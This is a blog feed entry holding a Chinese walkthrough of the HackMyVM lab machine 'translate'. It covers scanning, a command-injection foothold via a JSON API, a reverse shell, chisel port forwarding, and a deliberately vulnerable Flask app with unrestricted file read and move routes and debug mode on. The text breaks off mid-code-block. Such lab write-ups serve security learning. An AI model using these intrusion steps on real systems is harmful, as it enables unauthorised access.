<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HackMyVM-translate</title>
    <link href="/2025/05/29/HackMyVM-translate/"/>
    <url>/2025/05/29/HackMyVM-translate/</url>
    
    <content type="html"><![CDATA[<p>昨天群里发的靶机，很遗憾没能做成功，现在来复盘一下。</p><p>靶机ip:192.168.56.108</p><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><hr><p>nmap:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -T4 -A -v 192.168.56.108<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-28 23:25 EDT<br>NSE: Loaded 156 scripts <span class="hljs-keyword">for</span> scanning.<br>NSE: Script Pre-scanning.<br>Initiating NSE at 23:25<br>Completed NSE at 23:25, 0.00s elapsed<br>Initiating NSE at 23:25<br>Completed NSE at 23:25, 0.00s elapsed<br>Initiating NSE at 23:25<br>Completed NSE at 23:25, 0.00s elapsed<br>Initiating ARP Ping Scan at 23:25<br>Scanning 192.168.56.108 [1 port]<br>Completed ARP Ping Scan at 23:25, 0.05s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 23:25<br>Completed Parallel DNS resolution of 1 host. at 23:25, 0.02s elapsed<br>Initiating SYN Stealth Scan at 23:25<br>Scanning 192.168.56.108 [1000 ports]<br>Discovered open port 80/tcp on 192.168.56.108<br>Discovered open port 22/tcp on 192.168.56.108<br>Discovered open port 5001/tcp on 192.168.56.108<br>Completed SYN Stealth Scan at 23:25, 0.06s elapsed (1000 total ports)<br>Initiating Service scan at 23:25<br>Scanning 3 services on 192.168.56.108<br>Completed Service scan at 23:26, 91.31s elapsed (3 services on 1 host)<br>Initiating OS detection (try <span class="hljs-comment">#1) against 192.168.56.108</span><br>NSE: Script scanning 192.168.56.108.<br>Initiating NSE at 23:26<br>Completed NSE at 23:26, 0.83s elapsed<br>Initiating NSE at 23:26<br>Completed NSE at 23:26, 1.02s elapsed<br>Initiating NSE at 23:26<br>Completed NSE at 23:26, 0.00s elapsed<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.108<br>Host is up (0.0012s latency).<br>Not shown: 997 closed tcp ports (reset)<br>PORT     STATE SERVICE        VERSION<br>22/tcp   open  ssh            OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http           Apache httpd 2.4.62 ((Debian))<br>| http-methods: <br>|_  Supported Methods: OPTIONS HEAD GET POST<br>|_http-title: \xE6\x88\x91\xE7\x9A\x84\xE9\xA1\xB5\xE9\x9D\xA2<br>|_http-server-header: Apache/2.4.62 (Debian)<br>5001/tcp open  commplex-link?<br>| fingerprint-strings: <br>|   GetRequest: <br>|     HTTP/1.1 405 METHOD NOT ALLOWED<br>|     Server: Werkzeug/3.1.3 Python/3.9.2<br>|     Date: Thu, 29 May 2025 03:25:35 GMT<br>|     Content-Type: text/html; charset=utf-8<br>|     Allow: POST, OPTIONS<br>|     Content-Length: 153<br>|     Access-Control-Allow-Origin: *<br>|     Connection: close<br>|     &lt;!doctype html&gt;<br>|     &lt;html lang=en&gt;<br>|     &lt;title&gt;405 Method Not Allowed&lt;/title&gt;<br>|     &lt;h1&gt;Method Not Allowed&lt;/h1&gt;<br>|     &lt;p&gt;The method is not allowed <span class="hljs-keyword">for</span> the requested URL.&lt;/p&gt;<br>|   HTTPOptions: <br>|     HTTP/1.1 200 OK<br>|     Server: Werkzeug/3.1.3 Python/3.9.2<br>|     Date: Thu, 29 May 2025 03:25:35 GMT<br>|     Content-Type: text/html; charset=utf-8<br>|     Allow: POST, OPTIONS<br>|     Access-Control-Allow-Origin: *<br>|     Content-Length: 0<br>|     Connection: close<br>|   Help: <br>|     &lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br>|     <span class="hljs-string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;<br>|     &lt;html&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error response&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;h1&gt;Error response&lt;/h1&gt;<br>|     &lt;p&gt;Error code: 400&lt;/p&gt;<br>|     &lt;p&gt;Message: Bad request syntax (<span class="hljs-string">&#x27;HELP&#x27;</span>).&lt;/p&gt;<br>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;<br>|     &lt;/body&gt;<br>|     &lt;/html&gt;<br>|   RTSPRequest: <br>|     &lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br>|     <span class="hljs-string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;<br>|     &lt;html&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error response&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;h1&gt;Error response&lt;/h1&gt;<br>|     &lt;p&gt;Error code: 400&lt;/p&gt;<br>|     &lt;p&gt;Message: Bad request version (<span class="hljs-string">&#x27;RTSP/1.0&#x27;</span>).&lt;/p&gt;<br>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;<br>|     &lt;/body&gt;<br>|_    &lt;/html&gt;<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port5001-TCP:V=7.94SVN%I=7%D=5/28%Time=6837D3B0%P=x86_64-pc-linux-gnu%r<br>SF:(GetRequest,18C,<span class="hljs-string">&quot;HTTP/1\.1\x20405\x20METHOD\x20NOT\x20ALLOWED\r\nServer</span><br><span class="hljs-string">SF::\x20Werkzeug/3\.1\.3\x20Python/3\.9\.2\r\nDate:\x20Thu,\x2029\x20May\x</span><br><span class="hljs-string">SF:202025\x2003:25:35\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf</span><br><span class="hljs-string">SF:-8\r\nAllow:\x20POST,\x20OPTIONS\r\nContent-Length:\x20153\r\nAccess-Co</span><br><span class="hljs-string">SF:ntrol-Allow-Origin:\x20\*\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20h</span><br><span class="hljs-string">SF:tml&gt;\n&lt;html\x20lang=en&gt;\n&lt;title&gt;405\x20Method\x20Not\x20Allowed&lt;/title&gt;</span><br><span class="hljs-string">SF:\n&lt;h1&gt;Method\x20Not\x20Allowed&lt;/h1&gt;\n&lt;p&gt;The\x20method\x20is\x20not\x20a</span><br><span class="hljs-string">SF:llowed\x20for\x20the\x20requested\x20URL\.&lt;/p&gt;\n&quot;</span>)%r(HTTPOptions,E1,<span class="hljs-string">&quot;HT</span><br><span class="hljs-string">SF:TP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.1\.3\x20Python/3\.9\.2\r</span><br><span class="hljs-string">SF:\nDate:\x20Thu,\x2029\x20May\x202025\x2003:25:35\x20GMT\r\nContent-Type</span><br><span class="hljs-string">SF::\x20text/html;\x20charset=utf-8\r\nAllow:\x20POST,\x20OPTIONS\r\nAcces</span><br><span class="hljs-string">SF:s-Control-Allow-Origin:\x20\*\r\nContent-Length:\x200\r\nConnection:\x2</span><br><span class="hljs-string">SF:0close\r\n\r\n&quot;</span>)%r(RTSPRequest,1F4,<span class="hljs-string">&quot;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-/</span><br><span class="hljs-string">SF:/W3C//DTD\x20HTML\x204\.01//EN\&quot;\n\x20\x20\x20\x20\x20\x20\x20\x20\&quot;htt</span><br><span class="hljs-string">SF:p://www\.w3\.org/TR/html4/strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head</span><br><span class="hljs-string">SF:&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&quot;Content-Type\&quot;</span><br><span class="hljs-string">SF:\x20content=\&quot;text/html;charset=utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\</span><br><span class="hljs-string">SF:x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\</span><br><span class="hljs-string">SF:x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;/h</span><br><span class="hljs-string">SF:1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\n\x20\</span><br><span class="hljs-string">SF:x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20version\x20</span><br><span class="hljs-string">SF:\(&#x27;RTSP/1\.0&#x27;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code</span><br><span class="hljs-string">SF:\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20s</span><br><span class="hljs-string">SF:yntax\x20or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/</span><br><span class="hljs-string">SF:html&gt;\n&quot;</span>)%r(Help,1EF,<span class="hljs-string">&quot;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C//DTD\x20H</span><br><span class="hljs-string">SF:TML\x204\.01//EN\&quot;\n\x20\x20\x20\x20\x20\x20\x20\x20\&quot;http://www\.w3\.o</span><br><span class="hljs-string">SF:rg/TR/html4/strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x2</span><br><span class="hljs-string">SF:0\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&quot;Content-Type\&quot;\x20content=\&quot;</span><br><span class="hljs-string">SF:text/html;charset=utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;title&gt;Erro</span><br><span class="hljs-string">SF:r\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\</span><br><span class="hljs-string">SF:n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;/h1&gt;\n\x20\x20\x</span><br><span class="hljs-string">SF:20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\n\x20\x20\x20\x20\x2</span><br><span class="hljs-string">SF:0\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20syntax\x20\(&#x27;HELP&#x27;\)\.&lt;/p</span><br><span class="hljs-string">SF:&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code\x20explanation:\x20</span><br><span class="hljs-string">SF:HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20unsup</span><br><span class="hljs-string">SF:ported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;</span>);<br>MAC Address: 08:00:27:32:28:EA (Oracle VirtualBox virtual NIC)<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Uptime guess: 1.066 days (since Tue May 27 21:52:29 2025)<br>Network Distance: 1 hop<br>TCP Sequence Prediction: Difficulty=264 (Good luck!)<br>IP ID Sequence Generation: All zeros<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   1.20 ms 192.168.56.108<br><br>NSE: Script Post-scanning.<br>Initiating NSE at 23:26<br>Completed NSE at 23:26, 0.00s elapsed<br>Initiating NSE at 23:26<br>Completed NSE at 23:26, 0.00s elapsed<br>Initiating NSE at 23:26<br>Completed NSE at 23:26, 0.00s elapsed<br>Read data files from: /usr/share/nmap<br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 95.00 seconds<br>           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.290KB)<br></code></pre></td></tr></table></figure><p>dirsearch:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">Target: http://192.168.56.108/<br><br>[23:32:46] Starting:                                                                                                                    <br>[23:32:47] 403 -  279B  - /.ht_wsr.txt                                      <br>[23:32:47] 403 -  279B  - /.htaccess.bak1                                   <br>[23:32:47] 403 -  279B  - /.htaccess.orig                                   <br>[23:32:47] 403 -  279B  - /.htaccess.sample                                 <br>[23:32:47] 403 -  279B  - /.htaccess.save<br>[23:32:47] 403 -  279B  - /.htaccess_extra                                  <br>[23:32:47] 403 -  279B  - /.htaccessBAK<br>[23:32:47] 403 -  279B  - /.htaccess_orig<br>[23:32:47] 403 -  279B  - /.htaccess_sc<br>[23:32:47] 403 -  279B  - /.htaccessOLD<br>[23:32:47] 403 -  279B  - /.htaccessOLD2<br>[23:32:47] 403 -  279B  - /.htm                                             <br>[23:32:47] 403 -  279B  - /.html<br>[23:32:47] 403 -  279B  - /.htpasswds                                       <br>[23:32:47] 403 -  279B  - /.htpasswd_test                                   <br>[23:32:47] 403 -  279B  - /.httr-oauth<br>[23:32:48] 403 -  279B  - /.php                                             <br>[23:32:50] 200 -  644B  - /admin.php                                        <br>[23:33:06] 403 -  279B  - /server-status/                                   <br>[23:33:06] 403 -  279B  - /server-status                                    <br>                                                                             <br>Task Completed<br></code></pre></td></tr></table></figure><p>可以看到除了80端口和22端口以外还开放了一个5001端口，服务用的是Werkzeug&#x2F;3.1.3 Python&#x2F;3.9.2，当时上网搜了一下好像是个web框架的底层库，里面提到了一般和flask集成，我就想会不会是flask模板的ssti注入或者算pin值进console之类的，不过事实证明我方向完全错了。</p><p>（其实也不是完全错，事后一看B神的wp里提供了更改pin码设置后开启dubug进入console直接反弹shell提权的思路。)</p><p>之后我再去找这个库有没有什么现成的洞可以打，但是找到的全是3.0.x版本的，这条路也走不通了。</p><p>访问web主页。</p><p><img src="/2025/05/29/HackMyVM-translate/pH7UFqF60J.png"></p><p>看了源码，没啥东西，没有key，没有提示，之后访问&#x2F;admin.php,是个登录界面，也是光秃秃的啥都没有。</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_f5DrV3RHIs.png"></p><p>在yakit用rockyou爆了半小时之后我放弃了。</p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>什么路都走不通，只能去访问刚刚的5001端口。nmap的扫描报告给了一些信息，首先它必须要求POST访问。</p><p>改成POST之后还要我们接着改content-type，改成json形式</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_yszKIAg2wX.png"></p><p>提示让我们按照它的格式填键值对。</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_fG3ZiM6sEI.png"></p><p>这里第三个参数的格式是text_list，需要用方括号括起来。</p><p>返回的值是空值。</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_SicwfeMpka.png"></p><p>测试一下存在命令执行点，即为text_list的值。</p><p>哇这边本来想看一下当前目录结果直接给刚刚登录界面的账号密码了。</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_MbmfVK5thD.png"></p><p>但是看了一眼没有写的权限，本来还想写个webshell上去。</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_wE1xHuJUAh.png"></p><p>那只能反弹shell了，cat一下passwd，有bash，不过没装nc，用bash弹吧。</p><p>拿到的第一件事是升级成pty</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_erJqKubMOH.png"></p><p>但是这里我们也只是www-data，很小的一个权限，之后想办法提权吧</p><p>拿到userflag</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_VjV1wqtPt1.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">userflag:flag&#123;user-51860845-225a-42f3-b492-0a63bc722a96&#125;<br></code></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>两种思路</p><p>第一种是B神wp提供的，因为&#x2F;home&#x2F;welcome&#x2F;py里存放了flask服务的app.py源码，所以可以直接自定义一个PIN码供我们进入到console。</p><p>首先建立端口转发，这里因为不知道ssh口类所以不能用ssh，wget传一个chisel，将靶机的8000端口代理到本地的3000端口上。</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_xjNQoFWnob.png"></p><p>访问端口，发现是一个文件移动的服务。</p><p><img src="/2025/05/29/HackMyVM-translate/vmware_J3aYUH2SWH.png"></p><p>事实上就是利用了app.py的源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python">www-data@translate:/home/welcome/py$ cat app.py <br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, send_file, render_template<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> shutil<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/id&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_id</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 执行id命令并获取输出</span><br>        output = os.popen(<span class="hljs-string">&#x27;id&#x27;</span>).read()<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;id.html&#x27;</span>, id_info=output)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_page</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;path&#x27;</span> <span class="hljs-keyword">in</span> request.args:<br>        <span class="hljs-keyword">return</span> read_file()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;read.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/move&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">move_page</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">return</span> move_file()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;move.html&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_file</span>():<br>    <span class="hljs-keyword">try</span>:<br>        file_path = request.args.get(<span class="hljs-string">&#x27;path&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> file_path:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;请提供文件路径&#x27;</span>&#125;), <span class="hljs-number">400</span><br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(file_path):<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;文件不存在&#x27;</span>&#125;), <span class="hljs-number">404</span><br>        <br>        <span class="hljs-comment"># 返回文件内容</span><br>        <span class="hljs-keyword">return</span> send_file(file_path)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">move_file</span>():<br>    <span class="hljs-keyword">try</span>:<br>        data = request.get_json()<br>        source_path = data.get(<span class="hljs-string">&#x27;source&#x27;</span>)<br>        target_path = data.get(<span class="hljs-string">&#x27;target&#x27;</span>)<br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> source_path <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> target_path:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;请提供源文件路径和目标路径&#x27;</span>&#125;), <span class="hljs-number">400</span><br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(source_path):<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;源文件不存在&#x27;</span>&#125;), <span class="hljs-number">404</span><br>        <br>        <span class="hljs-comment"># 确保目标目录存在</span><br>        target_dir = os.path.dirname(target_path)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(target_dir):<br>            os.makedirs(target_dir)<br>        <br>        <span class="hljs-comment"># 移动文件</span><br>        shutil.move(source_path, target_path)<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;文件移动成功&#x27;</span>, <span class="hljs-string">&#x27;target_path&#x27;</span>: target_path&#125;)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>很明显，因为tmp目录下我们可读可写，可以利用这个服务使用我们的恶意app.py替换掉它。</p><p>接下来有两种思路。</p><p>第一种是B神wp提供的，因为&#x2F;home&#x2F;welcome&#x2F;py里存放了flask服务的app.py源码，而且开启了debug，不需要重启服务，所以可以直接自定义一个PIN码供我们进入到console。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 